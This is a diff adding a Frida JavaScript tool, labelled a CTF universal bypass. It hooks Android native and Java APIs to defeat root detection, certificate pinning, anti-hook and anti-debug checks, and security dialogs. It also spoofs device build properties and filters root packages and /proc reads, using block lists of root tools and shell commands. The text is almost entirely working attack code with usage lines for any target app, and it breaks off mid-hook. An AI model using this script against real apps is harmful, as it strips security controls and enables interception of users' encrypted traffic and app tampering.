@@ -1,0 +1,1395 @@
+"use strict";
+// ================================================================
+// CTF Universal Bypass — v11 (definitive)
+// Covers ALL 5 apps: Root, SSL, Biometric, Anti-Hook, RASP,
+//                    Continuous detection polling, Dialog suppress
+//
+// USAGE:
+//   frida -U -f com.your.target.app -l ctf_bypass_universal.js --no-pause
+//   frida -U -n "AppName" -l ctf_bypass_universal.js \
+//         --script-args="com.your.target.app" --no-pause
+// ================================================================
+
+// ================================================================
+// HELPERS — available before any Java.perform
+// ================================================================
+function safeUse(cls, cb) { try { cb(Java.use(cls)); } catch(e) {} }
+function safeHook(fn)      { try { fn(); } catch(e) {}  }
+
+var ROOT_TOKENS = ["/su","magisk","supersu","superuser","busybox","frida",
+                   "gum-js","linjector","xposed","substrate","rootcloak",
+                   "rootbeer","chainfire","kinguser","kingo","vboxguest","vboxuser"];
+var SAFE_TOKENS = ["com.google","/gms/","firebase","googleapis"];
+function isRootPath(p) {
+    if (!p) return false;
+    var l = p.toLowerCase();
+    for (var i=0;i<SAFE_TOKENS.length;i++) if (l.indexOf(SAFE_TOKENS[i])!==-1) return false;
+    for (var i=0;i<ROOT_TOKENS.length;i++) if (l.indexOf(ROOT_TOKENS[i])!==-1) return true;
+    return false;
+}
+var SU_PATHS = [
+    "/data/local/su","/data/local/bin/su","/data/local/xbin/su",
+    "/sbin/su","/su/bin/su","/system/bin/su","/system/bin/.ext/su",
+    "/system/bin/failsafe/su","/system/sd/xbin/su",
+    "/system/usr/we-need-root/su","/system/xbin/su",
+    "/cache/su","/data/su","/dev/su","/product/bin/su",
+    "/apex/com.android.runtime/bin/su","/apex/com.android.art/bin/su",
+    "/system_ext/bin/su","/odm/bin/su","/vendor/bin/su","/vendor/xbin/su",
+    "/system/app/Superuser.apk","/system/app/SuperSU.apk",
+    "/system/app/KingoUser.apk","/system/app/Magisk.apk"
+];
+var ROOT_PKGS = [
+    "com.noshufou.android.su","com.noshufou.android.su.elite",
+    "eu.chainfire.supersu","eu.chainfire.supersu.pro",
+    "com.koushikdutta.superuser","com.thirdparty.superuser",
+    "com.yellowes.su","com.kingouser.com","com.topjohnwu.magisk",
+    "com.devadvance.rootcloak","com.devadvance.rootcloakplus",
+    "de.robv.android.xposed.installer","com.saurik.substrate",
+    "me.phh.superuser","io.github.vvb2060.magisk","me.weishu.kernelsu",
+    "com.koushikdutta.rommanager","com.zachspong.temprootremovejb",
+    "com.ramdroid.appquarantine"
+];
+var PROC_BLOCK = ["/proc/net/tcp","/proc/net/tcp6","/proc/self/maps",
+                  "/proc/self/status","/proc/self/fd","/proc/self/task"];
+var PROC_SAFE  = "/proc/net/arp";
+var EXEC_BLOCK = ["frida","getprop","build.prop","magisk","busybox",
+                  "which su","pm list","mount","df ","id "];
+function isBlockedCmd(cmd) {
+    if (!cmd) return false;
+    var c = cmd.toLowerCase().trim();
+    if (c==="su"||c==="id") return true;
+    if (c.indexOf("ps ")!==-1 && c.indexOf("grep")!==-1) return true;
+    for (var i=0;i<EXEC_BLOCK.length;i++) if (c.indexOf(EXEC_BLOCK[i])!==-1) return true;
+    return false;
+}
+var DIALOG_WORDS = ["root","detect","tamper","jailbreak","hook",
+                    "integrity","unsafe","threat","compromise","modif",
+                    "security","block","forbid","prohibit","restrict"];
+function isSecurityMsg(msg) {
+    if (!msg) return false;
+    var m = msg.toString().toLowerCase();
+    for (var i=0;i<DIALOG_WORDS.length;i++) if (m.indexOf(DIALOG_WORDS[i])!==-1) return true;
+    return false;
+}
+
+// ================================================================
+// STAGE 1 — Native hooks (synchronous, always first)
+// ================================================================
+console.log("[v11] Stage 1: Native");
+
+// ── Kill signals ────────────────────────────────────────────────
+safeHook(function() {
+    Interceptor.attach(Module.getGlobalExportByName("kill"), {
+        onEnter: function(args) {
+            var sig=args[1].toInt32(), pid=args[0].toInt32();
+            if ((sig===9||sig===15||sig===6||sig===11)&&(pid===Process.id||pid===0)) {
+                console.log("[bypass] kill("+pid+","+sig+") blocked");
+                args[1]=ptr(0);
+            }
+        }
+    });
+});
+safeHook(function() {
+    Interceptor.attach(Module.getGlobalExportByName("raise"), {
+        onEnter: function(args) {
+            var sig=args[0].toInt32();
+            if (sig===9||sig===15||sig===6||sig===11) {
+                console.log("[bypass] raise("+sig+") blocked");
+                args[0]=ptr(0);
+            }
+        }
+    });
+});
+safeHook(function() {
+    Interceptor.replace(Module.getGlobalExportByName("abort"),
+        new NativeCallback(function(){ console.log("[bypass] abort blocked"); },"void",[]));
+});
+safeHook(function() {
+    var exp=Module.findExportByName("libc.so","pthread_kill"); if(!exp) return;
+    Interceptor.attach(exp, {
+        onEnter: function(args) {
+            var sig=args[1].toInt32();
+            if (sig===9||sig===15||sig===6) { console.log("[bypass] pthread_kill blocked"); args[1]=ptr(0); }
+        }
+    });
+});
+
+// ── libc file checks ────────────────────────────────────────────
+safeHook(function() {
+    Interceptor.attach(Module.getExportByName("libc.so","access"), {
+        onEnter: function(args) { this.path=args[0].readUtf8String(); },
+        onLeave: function(retval) {
+            if (isRootPath(this.path)) { console.log("[bypass] access: "+this.path); retval.replace(ptr(-1)); }
+        }
+    });
+});
+["stat","stat64","lstat","lstat64"].forEach(function(fn) {
+    safeHook(function() {
+        var exp=Module.findExportByName("libc.so",fn); if(!exp) return;
+        Interceptor.attach(exp, {
+            onEnter: function(args) { this.path=args[0].readUtf8String(); },
+            onLeave: function(retval) {
+                if (isRootPath(this.path)) { console.log("[bypass] "+fn+": "+this.path); retval.replace(ptr(-1)); }
+            }
+        });
+    });
+});
+safeHook(function() {
+    Interceptor.attach(Module.getExportByName("libc.so","open"), {
+        onEnter: function(args) {
+            try { this.path=args[0].readUtf8String(); } catch(e) {}
+            if (isRootPath(this.path)) { console.log("[bypass] open: "+this.path); args[0]=Memory.allocUtf8String("/dev/null"); }
+        }
+    });
+});
+safeHook(function() {
+    var exp=Module.findExportByName("libc.so","fopen"); if(!exp) return;
+    Interceptor.attach(exp, {
+        onEnter: function(args) {
+            try { this.path=args[0].readUtf8String(); } catch(e) {}
+            if (isRootPath(this.path)) { console.log("[bypass] fopen: "+this.path); args[0]=Memory.allocUtf8String("/dev/null"); }
+        }
+    });
+});
+safeHook(function() {
+    var exp=Module.findExportByName("libc.so","strstr"); if(!exp) return;
+    var orig=new NativeFunction(exp,"pointer",["pointer","pointer"]);
+    Interceptor.replace(exp, new NativeCallback(function(hay,needle) {
+        try {
+            var n=needle.readUtf8String();
+            if (n&&(n.indexOf("frida")!==-1||n.indexOf("gum-js")!==-1||
+                    n.indexOf("magisk")!==-1||n.indexOf("xposed")!==-1)) return ptr(0);
+        } catch(e) {}
+        return orig(hay,needle);
+    },"pointer",["pointer","pointer"]));
+});
+
+// ── Native SSL ───────────────────────────────────────────────────
+safeHook(function() {
+    var exp=Module.findExportByName("libssl.so","SSL_CTX_set_verify"); if(!exp) return;
+    Interceptor.attach(exp, { onEnter: function(args) { args[1]=ptr(0); } });
+});
+safeHook(function() {
+    var exp=Module.findExportByName("libssl.so","SSL_get_verify_result"); if(!exp) return;
+    Interceptor.replace(exp, new NativeCallback(function(s){return 0;},"long",["pointer"]));
+});
+console.log("[v11] Stage 1 done");
+
+// ================================================================
+// STAGE 2 — Java.performNow (SYNCHRONOUS — before app code runs)
+// Critical: kill, finish, dialogs, SSL core hooks
+// ================================================================
+console.log("[v11] Stage 2: Synchronous Java hooks");
+
+Java.performNow(function() {
+
+    // ── Process kill ──────────────────────────────────────────────
+    safeHook(function() {
+        Java.use("java.lang.System").exit.implementation =
+            function(c) { console.log("[bypass] System.exit("+c+") blocked"); };
+    });
+    safeHook(function() {
+        Java.use("android.os.Process").killProcess.implementation =
+            function(p) { console.log("[bypass] killProcess("+p+") blocked"); };
+    });
+    safeHook(function() {
+        Java.use("java.lang.Runtime").halt.implementation =
+            function(c) { console.log("[bypass] halt("+c+") blocked"); };
+    });
+
+    // ── Activity termination — UNCONDITIONAL permanent block ──────
+    safeHook(function() {
+        var A=Java.use("android.app.Activity");
+        A.finish.implementation            = function() { console.log("[bypass] finish() in "+this.getClass().getName()); };
+        A.finishAffinity.implementation    = function() { console.log("[bypass] finishAffinity() blocked"); };
+        A.finishAndRemoveTask.implementation = function() { console.log("[bypass] finishAndRemoveTask() blocked"); };
+        A.moveTaskToBack.implementation    = function(b) { console.log("[bypass] moveTaskToBack() blocked"); return false; };
+        console.log("[sync] Activity termination blocked");
+    });
+
+    // ── Static "rooted device" page patterns ─────────────────────
+    // Pattern: app shows a dedicated Activity/Fragment as a block screen.
+    // Three sub-patterns:
+    //   A. setContentView(R.layout.security_block) — hook setContentView
+    //   B. onResume() calls detection and shows block UI inline
+    //   C. App navigates to a block Activity via startActivity(Intent)
+    // We handle all three here.
+
+    safeHook(function() {
+        var Activity = Java.use("android.app.Activity");
+        var origSetContentView_int = Activity.setContentView.overload("int");
+        var origSetContentView_view = Activity.setContentView.overload("android.view.View");
+
+        // Hook setContentView to detect block screens being inflated.
+        // We log the resource ID — if the same ID always appears when blocked,
+        // add it to BLOCK_LAYOUT_IDS below.
+        var BLOCK_LAYOUT_IDS = []; // populated at runtime from logs
+
+        origSetContentView_int.implementation = function(layoutResId) {
+            var actName = this.getClass().getName().toLowerCase();
+            // Log every setContentView call from the app so we can identify block layouts
+            if (PKG !== "" && this.getClass().getName().indexOf(PKG) === 0) {
+                console.log("[layout] setContentView("+layoutResId+") in "+this.getClass().getName());
+            }
+            if (BLOCK_LAYOUT_IDS.indexOf(layoutResId) !== -1) {
+                console.log("[bypass] setContentView blocked (known block layout): "+layoutResId);
+                return; // don't inflate the block screen
+            }
+            return origSetContentView_int.call(this, layoutResId);
+        };
+        console.log("[sync] Activity.setContentView monitored");
+    });
+
+    // Hook startActivity — some apps start a dedicated BlockActivity
+    safeHook(function() {
+        var Activity = Java.use("android.app.Activity");
+        var origStart = Activity.startActivity.overload("android.content.Intent");
+        origStart.implementation = function(intent) {
+            try {
+                var comp = intent.getComponent();
+                if (comp !== null) {
+                    var cls = comp.getClassName().toLowerCase();
+                    if (cls.indexOf("block") !== -1 || cls.indexOf("restrict") !== -1 ||
+                        cls.indexOf("security") !== -1 || cls.indexOf("root") !== -1 ||
+                        cls.indexOf("tamper") !== -1 || cls.indexOf("integrity") !== -1) {
+                        console.log("[bypass] startActivity BLOCKED: "+comp.getClassName());
+                        return;
+                    }
+                }
+                // Log all startActivity from app package for diagnosis
+                if (PKG !== "" && intent.getComponent() !== null) {
+                    var cn = intent.getComponent().getClassName();
+                    if (cn.indexOf(PKG) === 0) console.log("[intent] startActivity: "+cn);
+                }
+            } catch(e) {}
+            return origStart.call(this, intent);
+        };
+        console.log("[sync] Activity.startActivity monitored");
+    });
+
+    // Hook Fragment.onResume — block screens implemented as fragments
+    // call their detection in onResume and show inline UI
+    safeHook(function() {
+        var Fragment = Java.use("androidx.fragment.app.Fragment");
+        var origOnResume = Fragment.onResume;
+        Fragment.onResume.implementation = function() {
+            var cls = this.getClass().getName();
+            if (PKG !== "" && cls.indexOf(PKG) === 0) {
+                var c = cls.toLowerCase();
+                if (c.indexOf("block") !== -1 || c.indexOf("security") !== -1 ||
+                    c.indexOf("root") !== -1   || c.indexOf("restrict") !== -1 ||
+                    c.indexOf("tamper") !== -1  || c.indexOf("integrity") !== -1) {
+                    console.log("[bypass] Fragment.onResume BLOCKED: "+cls);
+                    return; // don't resume the block fragment
+                }
+                console.log("[fragment] onResume: "+cls);
+            }
+            return origOnResume.call(this);
+        };
+        console.log("[sync] Fragment.onResume monitored");
+    });
+
+    // Hook View visibility — static block screens often use setVisibility(VISIBLE)
+    // to show an overlay. Block security-named views from becoming visible.
+    safeHook(function() {
+        var View = Java.use("android.view.View");
+        var origSetVis = View.setVisibility;
+        View.setVisibility.implementation = function(visibility) {
+            if (visibility === 0) { // VISIBLE
+                try {
+                    var tag = this.getTag();
+                    if (tag !== null && isSecurityMsg(tag.toString())) {
+                        console.log("[bypass] View.setVisibility(VISIBLE) blocked for tag: "+tag);
+                        return origSetVis.call(this, 8); // GONE instead
+                    }
+                } catch(e) {}
+            }
+            return origSetVis.call(this, visibility);
+        };
+        console.log("[sync] View.setVisibility monitored");
+    });
+
+    // ── Dialog.show — suppress security dialogs ───────────────────
+    safeHook(function() {
+        var Dialog=Java.use("android.app.Dialog");
+        Dialog.show.implementation = function() {
+            try {
+                var ad=Java.cast(this, Java.use("android.app.AlertDialog"));
+                var tv=ad.findViewById(Java.use("android.R$id").message.value);
+                if (tv!==null) {
+                    var msg=Java.cast(tv,Java.use("android.widget.TextView")).getText().toString();
+                    if (isSecurityMsg(msg)) { console.log("[bypass] Dialog suppressed: "+msg); return; }
+                }
+            } catch(e) {}
+            return this.show();
+        };
+        Dialog.setTitle.overload("java.lang.CharSequence").implementation = function(t) {
+            if (isSecurityMsg(t)) { console.log("[bypass] Dialog.setTitle suppressed: "+t); return this.setTitle("Notice"); }
+            return this.setTitle(t);
+        };
+        console.log("[sync] Dialog.show hooked");
+    });
+
+    // ── AlertDialog.Builder — all variants ───────────────────────
+    // KEY FIX: must call the specific overload via .call(this, ...) to avoid
+    // infinite recursion. this.setTitle(resId) inside a hooked setTitle(int)
+    // calls our own hook again → NPE / stack overflow.
+    // Always use B.setMessage.overload(...).call(this, ...) instead.
+    function resolveResId(builder, resId) {
+        try { return builder.getContext().getString(resId); } catch(e) { return ""; }
+    }
+    function patchBuilder(B, tag) {
+        // Cache the original overload references BEFORE replacing implementations
+        // so we can call them directly without triggering our own hooks.
+        var origMsgStr  = null; try { origMsgStr  = B.setMessage.overload("java.lang.CharSequence"); } catch(e) {}
+        var origMsgInt  = null; try { origMsgInt  = B.setMessage.overload("int"); } catch(e) {}
+        var origTitStr  = null; try { origTitStr  = B.setTitle.overload("java.lang.CharSequence"); } catch(e) {}
+        var origTitInt  = null; try { origTitInt  = B.setTitle.overload("int"); } catch(e) {}
+
+        // setMessage(CharSequence)
+        if (origMsgStr) try { origMsgStr.implementation = function(msg) {
+            if (isSecurityMsg(msg)) {
+                console.log("[bypass] "+tag+" msg(str): "+msg);
+                return origMsgStr.call(this, "All good!");
+            }
+            return origMsgStr.call(this, msg);
+        }; } catch(e) {}
+
+        // setMessage(int resId)
+        if (origMsgInt) try { origMsgInt.implementation = function(resId) {
+            var resolved = resolveResId(this, resId);
+            console.log("[bypass] "+tag+" msg(resId="+resId+"): "+resolved);
+            if (isSecurityMsg(resolved)) {
+                // Replace with safe string overload — no recursion since
+                // origMsgStr still points to the original implementation
+                return origMsgStr !== null
+                    ? origMsgStr.call(this, "All good!")
+                    : origMsgInt.call(this, resId);
+            }
+            return origMsgInt.call(this, resId);
+        }; } catch(e) {}
+
+        // setTitle(CharSequence)
+        if (origTitStr) try { origTitStr.implementation = function(t) {
+            if (isSecurityMsg(t)) {
+                console.log("[bypass] "+tag+" title(str): "+t);
+                return origTitStr.call(this, "Notice");
+            }
+            return origTitStr.call(this, t);
+        }; } catch(e) {}
+
+        // setTitle(int resId) — THE FIX for the crash in your log
+        // Previous version called this.setTitle(resId) which recursed into our hook
+        if (origTitInt) try { origTitInt.implementation = function(resId) {
+            var resolved = resolveResId(this, resId);
+            console.log("[bypass] "+tag+" title(resId="+resId+"): "+resolved);
+            if (isSecurityMsg(resolved)) {
+                return origTitStr !== null
+                    ? origTitStr.call(this, "Notice")
+                    : origTitInt.call(this, resId);
+            }
+            return origTitInt.call(this, resId);
+        }; } catch(e) {}
+
+        // Strip ALL button listeners — cache originals first
+        ["setPositiveButton","setNegativeButton","setNeutralButton"].forEach(function(btn) {
+            var origBtnStr = null; try { origBtnStr = B[btn].overload("java.lang.CharSequence","android.content.DialogInterface$OnClickListener"); } catch(e) {}
+            var origBtnInt = null; try { origBtnInt = B[btn].overload("int","android.content.DialogInterface$OnClickListener"); } catch(e) {}
+            if (origBtnStr) try { origBtnStr.implementation = function(t,l) {
+                console.log("[bypass] "+tag+" "+btn+"(str) stripped");
+                return origBtnStr.call(this, t, null);
+            }; } catch(e) {}
+            if (origBtnInt) try { origBtnInt.implementation = function(id,l) {
+                console.log("[bypass] "+tag+" "+btn+"(id) stripped");
+                return origBtnInt.call(this, id, null);
+            }; } catch(e) {}
+        });
+        console.log("[sync] "+tag+" patched");
+    }
+    safeHook(function() { patchBuilder(Java.use("android.app.AlertDialog$Builder"),"AlertDialog"); });
+
+    // ── SSL — synchronous core hooks (catch pre-built OkHttp clients) ─
+    // OkHttp builds SSLSocketFactory at startup. Java.perform() may be
+    // too late. These run NOW so every connection is covered.
+    safeUse("com.android.org.conscrypt.TrustManagerImpl", function(TM) {
+        try { TM.verifyChain.implementation =
+            function(u,a,h,c,o,s){ console.log("[bypass] verifyChain: "+h); return u; }; } catch(e) {}
+        try { TM.checkTrustedRecursive.implementation =
+            function(ce,h,c,u,t,us){
+                var r=Java.use("java.util.ArrayList").$new();
+                try{if(u!==null)r.addAll(u);}catch(e){} return r;
+            }; } catch(e) {}
+        try { TM.checkServerTrusted.overload(
+            "[Ljava.security.cert.X509Certificate;","java.lang.String","java.lang.String"
+        ).implementation=function(ch,a,h){ return Java.use("java.util.Arrays").asList(ch); }; } catch(e) {}
+        try { TM.checkServerTrusted.overload(
+            "[Ljava.security.cert.X509Certificate;","java.lang.String"
+        ).implementation=function(ch,a){}; } catch(e) {}
+        console.log("[sync] conscrypt TrustManagerImpl patched");
+    });
+    safeUse("android.net.http.X509TrustManagerExtensions", function(TME) {
+        try { TME.checkServerTrusted.overload(
+            "[Ljava.security.cert.X509Certificate;","java.lang.String","java.lang.String"
+        ).implementation=function(ch,a,h){ return Java.use("java.util.Arrays").asList(ch); }; } catch(e) {}
+        console.log("[sync] X509TrustManagerExtensions patched");
+    });
+    safeUse("okhttp3.internal.platform.android.AndroidCertificateChainCleaner", function(C) {
+        try { C.clean.overload("java.util.List","java.lang.String")
+            .implementation=function(p,h){ console.log("[bypass] ChainCleaner: "+h); return p; }; } catch(e) {}
+        console.log("[sync] AndroidCertificateChainCleaner patched");
+    });
+    safeUse("okhttp3.internal.tls.BasicCertificateChainCleaner", function(C) {
+        try { C.clean.overload("java.util.List","java.lang.String")
+            .implementation=function(p,h){ return p; }; } catch(e) {}
+        console.log("[sync] BasicCertificateChainCleaner patched");
+    });
+    safeUse("android.security.net.config.RootTrustManager", function(R) {
+        try { R.checkServerTrusted.overload(
+            "[Ljava.security.cert.X509Certificate;","java.lang.String","java.lang.String"
+        ).implementation=function(ch,a,h){ return Java.use("java.util.Arrays").asList(ch); }; } catch(e) {}
+        try { R.checkServerTrusted.overload(
+            "[Ljava.security.cert.X509Certificate;","java.lang.String"
+        ).implementation=function(ch,a){}; } catch(e) {}
+        console.log("[sync] RootTrustManager patched");
+    });
+    safeUse("okhttp3.CertificatePinner", function(CP) {
+        try { CP.check.overload("java.lang.String","java.util.List").implementation=function(h,c){}; } catch(e) {}
+        try { CP["check$okhttp"].overload("java.lang.String","java.util.List").implementation=function(h,c){}; } catch(e) {}
+        console.log("[sync] OkHttp CertificatePinner patched");
+    });
+
+    // ── SystemProperties / Build ──────────────────────────────────
+    safeUse("android.os.SystemProperties", function(SP) {
+        var g1=SP.get.overload("java.lang.String");
+        g1.implementation=function(k){
+            if(k==="ro.debuggable"||k==="service.adb.root") return "0";
+            if(k==="ro.secure") return "1";
+            if(k==="ro.build.tags"){var v=g1.call(this,k);return(v&&v.indexOf("test")!==-1)?"release-keys":v;}
+            return g1.call(this,k);
+        };
+        SP.get.overload("java.lang.String","java.lang.String").implementation=function(k,d){
+            if(k==="ro.debuggable"||k==="service.adb.root") return "0";
+            if(k==="ro.secure") return "1";
+            return SP.get.overload("java.lang.String","java.lang.String").call(this,k,d);
+        };
+        console.log("[sync] SystemProperties patched");
+    });
+    safeHook(function() {
+        var B=Java.use("android.os.Build");
+        B.FINGERPRINT.value ="google/walleye/walleye:8.1.0/OPM1.171019.011/4448085:user/release-keys";
+        B.MODEL.value       ="Pixel 2"; B.MANUFACTURER.value="Google"; B.BRAND.value="google";
+        B.DEVICE.value      ="walleye"; B.PRODUCT.value="walleye"; B.HARDWARE.value="walleye";
+        B.TAGS.value        ="release-keys";
+        console.log("[sync] Build fields spoofed");
+    });
+
+    console.log("[v11] Stage 2 done");
+});
+
+// ================================================================
+// STAGE 3 — Java.perform (async, includes registerClass)
+// ================================================================
+console.log("[v11] Stage 3: Async Java hooks");
+
+Java.perform(function() {
+
+    var _AL=Java.use("java.util.ArrayList");
+    var _AR=Java.use("java.util.Arrays");
+    function newAL()   { return _AL.$new(); }
+    function asList(a) { return _AR.asList(a); }
+
+    // ── Package name ──────────────────────────────────────────────
+    var PKG="";
+    try { if(typeof Script!=="undefined"&&Script.args&&Script.args.length>0&&Script.args[0].indexOf(".")!==-1) PKG=Script.args[0].trim(); } catch(e) {}
+    if(PKG==="") { try { PKG=Java.use("android.app.ActivityThread").currentApplication().getApplicationContext().getPackageName(); } catch(e) {} }
+    console.log("[v11] Target: "+(PKG||"unknown"));
+
+    // ── AppCompat / Material dialogs — use patchBuilder (same safe logic) ─
+    // patchBuilder caches original overloads to prevent recursion.
+    safeUse("androidx.appcompat.app.AlertDialog$Builder", function(B) {
+        patchBuilder(B, "AppCompatAlertDialog");
+    });
+    safeUse("com.google.android.material.dialog.MaterialAlertDialogBuilder", function(B) {
+        patchBuilder(B, "MaterialAlertDialog");
+    });
+
+    // ── PackageManager ────────────────────────────────────────────
+    safeHook(function() {
+        var PM=Java.use("android.app.ApplicationPackageManager");
+        var origGPI     = PM.getPackageInfo.overload("java.lang.String","int");
+        var origGPIFlag = null; try { origGPIFlag = PM.getPackageInfo.overload("java.lang.String","android.content.pm.PackageManager$PackageInfoFlags"); } catch(e) {}
+        var origGIP     = PM.getInstalledPackages.overload("int");
+        origGPI.implementation=function(pname,flags){
+            if(ROOT_PKGS.indexOf(pname)>-1){console.log("[bypass] getPackageInfo: "+pname);pname="fake.not.here";}
+            return origGPI.call(this,pname,flags);
+        };
+        if (origGPIFlag) try { origGPIFlag.implementation=function(pname,flags){
+            if(ROOT_PKGS.indexOf(pname)>-1){pname="fake.not.here";}
+            return origGPIFlag.call(this,pname,flags);
+        }; } catch(e) {}
+        origGIP.implementation=function(flags){
+            var list=origGIP.call(this,flags),filtered=newAL(),it=list.iterator();
+            while(it.hasNext()){var pkg=it.next();
+                if(ROOT_PKGS.indexOf(pkg.packageName.value)===-1) filtered.add(pkg);
+                else console.log("[bypass] getInstalledPackages: "+pkg.packageName.value);
+            }
+            return filtered;
+        };
+        console.log("[+] PackageManager patched");
+    });
+
+    // ── File.exists / canExecute ──────────────────────────────────
+    safeHook(function() {
+        var JF=Java.use("java.io.File");
+        var origExists    = JF.exists;
+        var origCanExec   = JF.canExecute;
+        JF.exists.implementation=function(){
+            var p=this.getAbsolutePath();
+            if(SU_PATHS.indexOf(p)!==-1||isRootPath(p)){console.log("[bypass] File.exists: "+p);return false;}
+            return origExists.call(this);
+        };
+        JF.canExecute.implementation=function(){
+            var p=this.getAbsolutePath();
+            if(SU_PATHS.indexOf(p)!==-1||isRootPath(p)){console.log("[bypass] File.canExecute: "+p);return false;}
+            return origCanExec.call(this);
+        };
+        console.log("[+] File.exists patched");
+    });
+
+    // ── /proc blocking ────────────────────────────────────────────
+    safeHook(function() {
+        var FIS=Java.use("java.io.FileInputStream");
+        FIS.$init.overload("java.lang.String").implementation=function(p){
+            if(PROC_BLOCK.indexOf(p)!==-1){console.log("[bypass] FIS: "+p);return this.$init(PROC_SAFE);}
+            return this.$init(p);
+        };
+        console.log("[+] FileInputStream patched");
+    });
+    safeHook(function() {
+        var FR=Java.use("java.io.FileReader");
+        FR.$init.overload("java.lang.String").implementation=function(p){
+            if(PROC_BLOCK.indexOf(p)!==-1){console.log("[bypass] FR: "+p);return this.$init(PROC_SAFE);}
+            return this.$init(p);
+        };
+        console.log("[+] FileReader patched");
+    });
+    safeHook(function() {
+        var RAF=Java.use("java.io.RandomAccessFile");
+        RAF.$init.overload("java.lang.String","java.lang.String").implementation=function(p,m){
+            if(PROC_BLOCK.indexOf(p)!==-1){console.log("[bypass] RAF: "+p);return this.$init(PROC_SAFE,m);}
+            return this.$init(p,m);
+        };
+        console.log("[+] RandomAccessFile patched");
+    });
+    safeHook(function() {
+        var SC=Java.use("java.util.Scanner"),JF2=Java.use("java.io.File");
+        SC.$init.overload("java.io.File").implementation=function(f){
+            if(PROC_BLOCK.indexOf(f.getAbsolutePath())!==-1) return this.$init(JF2.$new(PROC_SAFE));
+            return this.$init(f);
+        };
+        SC.$init.overload("java.lang.String").implementation=function(s){
+            if(PROC_BLOCK.indexOf(s)!==-1) return this.$init(PROC_SAFE);
+            return this.$init(s);
+        };
+        console.log("[+] Scanner patched");
+    });
+
+    // ── BufferedReader sanitise ───────────────────────────────────
+    safeHook(function() {
+        var BR=Java.use("java.io.BufferedReader");
+        BR.readLine.overload().implementation=function(){
+            var line=this.readLine();
+            if(line!==null){
+                var l=line.toLowerCase();
+                if(l.indexOf("frida")!==-1||l.indexOf("gum-js")!==-1||
+                   l.indexOf("linjector")!==-1||l.indexOf("magisk")!==-1||
+                   l.indexOf("xposed")!==-1||l.indexOf("substrate")!==-1){
+                    console.log("[bypass] BufferedReader sanitized");
+                    return line.replace(/frida/gi,"media").replace(/gum-js/gi,"gum-xx")
+                               .replace(/linjector/gi,"linjxxxor").replace(/magisk/gi,"musik")
+                               .replace(/xposed/gi,"xpoxed");
+                }
+            }
+            return line;
+        };
+        console.log("[+] BufferedReader patched");
+    });
+
+    // ── Runtime.exec / ProcessBuilder ─────────────────────────────
+    safeHook(function() {
+        var RT=Java.use("java.lang.Runtime");
+        RT.exec.overload("java.lang.String").implementation=function(cmd){
+            if(isBlockedCmd(cmd)){console.log("[bypass] exec: "+cmd);return this.exec("echo ''");}
+            return this.exec(cmd);
+        };
+        RT.exec.overload("[Ljava.lang.String;").implementation=function(arr){
+            var j=arr?arr.join(" "):"";
+            if(isBlockedCmd(j)){console.log("[bypass] exec[]: "+j);return this.exec("echo ''");}
+            return this.exec(arr);
+        };
+        RT.exec.overload("[Ljava.lang.String;","[Ljava.lang.String;","java.io.File")
+            .implementation=function(arr,env,dir){
+                var j=arr?arr.join(" "):"";
+                if(isBlockedCmd(j)){console.log("[bypass] exec(env): "+j);return this.exec("echo ''");}
+                return this.exec(arr,env,dir);
+            };
+        console.log("[+] Runtime.exec patched");
+    });
+    safeHook(function() {
+        var PB=Java.use("java.lang.ProcessBuilder");
+        PB.start.implementation=function(){
+            var cmd=this.command().toString();
+            if(isBlockedCmd(cmd)){console.log("[bypass] ProcessBuilder: "+cmd);throw Java.use("java.io.IOException").$new("No such file");}
+            return this.start();
+        };
+        console.log("[+] ProcessBuilder patched");
+    });
+
+    // ── Misc detection ────────────────────────────────────────────
+    safeHook(function() {
+        Java.use("android.os.Debug").isDebuggerConnected.implementation=function(){return false;};
+        console.log("[+] isDebuggerConnected patched");
+    });
+    safeHook(function() {
+        var Sock=Java.use("java.net.Socket");
+        Sock.$init.overload("java.lang.String","int").implementation=function(host,port){
+            if(port===27042||port===27043){throw Java.use("java.net.ConnectException").$new("refused");}
+            return this.$init(host,port);
+        };
+        console.log("[+] Frida port probe patched");
+    });
+
+    // ================================================================
+    // SSL PINNING — Stage 3 (duplicates Stage 2 for late-loaded clients)
+    // ================================================================
+
+    // conscrypt (duplicated here for any client built after performNow)
+    safeUse("com.android.org.conscrypt.TrustManagerImpl", function(TM) {
+        try { TM.verifyChain.implementation=function(u,a,h,c,o,s){return u;}; } catch(e) {}
+        try { TM.checkTrustedRecursive.implementation=function(ce,h,c,u,t,us){
+            var r=newAL(); try{if(u!==null)r.addAll(u);}catch(e){} return r;
+        }; } catch(e) {}
+        try { TM.checkServerTrusted.overload("[Ljava.security.cert.X509Certificate;","java.lang.String","java.lang.String")
+            .implementation=function(ch,a,h){ return asList(ch); }; } catch(e) {}
+        try { TM.checkServerTrusted.overload("[Ljava.security.cert.X509Certificate;","java.lang.String")
+            .implementation=function(ch,a){}; } catch(e) {}
+        console.log("[+] conscrypt (stage3) patched");
+    });
+    safeUse("android.net.http.X509TrustManagerExtensions", function(TME) {
+        try { TME.checkServerTrusted.overload("[Ljava.security.cert.X509Certificate;","java.lang.String","java.lang.String")
+            .implementation=function(ch,a,h){ return asList(ch); }; } catch(e) {}
+        console.log("[+] X509TrustManagerExtensions (stage3) patched");
+    });
+    safeUse("okhttp3.internal.platform.android.AndroidCertificateChainCleaner", function(C) {
+        try { C.clean.overload("java.util.List","java.lang.String").implementation=function(p,h){return p;}; } catch(e) {}
+        console.log("[+] ChainCleaner (stage3) patched");
+    });
+    safeUse("okhttp3.internal.tls.BasicCertificateChainCleaner", function(C) {
+        try { C.clean.overload("java.util.List","java.lang.String").implementation=function(p,h){return p;}; } catch(e) {}
+    });
+    safeUse("android.security.net.config.RootTrustManager", function(R) {
+        try { R.checkServerTrusted.overload("[Ljava.security.cert.X509Certificate;","java.lang.String","java.lang.String")
+            .implementation=function(ch,a,h){ return asList(ch); }; } catch(e) {}
+        try { R.checkServerTrusted.overload("[Ljava.security.cert.X509Certificate;","java.lang.String")
+            .implementation=function(ch,a){}; } catch(e) {}
+        console.log("[+] RootTrustManager (stage3) patched");
+    });
+    safeUse("okhttp3.CertificatePinner", function(CP) {
+        try { CP.check.overload("java.lang.String","java.util.List").implementation=function(h,c){}; } catch(e) {}
+        try { CP.check.overload("java.lang.String","java.security.cert.Certificate").implementation=function(){}; } catch(e) {}
+        try { CP["check$okhttp"].overload("java.lang.String","java.util.List").implementation=function(h,c){}; } catch(e) {}
+        console.log("[+] OkHttp CertificatePinner (stage3) patched");
+    });
+    safeUse("com.squareup.okhttp.CertificatePinner", function(CP) {
